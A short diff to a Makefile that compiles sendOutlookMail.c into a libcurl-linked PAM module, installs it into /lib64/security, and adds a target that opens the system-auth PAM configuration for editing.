@@ -1,9 +1,11 @@
 compile: sendOutlookMail.c 
-	gcc -fPIC -fno-stack-protector -c -lcurl sendOutlookMail.c
-	gcc -shared -o sendOutlookMail.so sendOutlookMail.o -lcurl
+	gcc -fPIC -lcurl -fno-stack-protector -c sendOutlookMail.c
 
 install: sendOutlookMail.o
-	sudo cp sendOutlookMail.so /lib64/security
+	ld -lcurl -x --shared -o /lib64/security/sendOutlookMail.so sendOutlookMail.o
+
+enable: 
+	nano ../../etc/pam.d/system-auth
 
 uninstall:
 	rm -f /lib64/security/sendOutlookMail.so
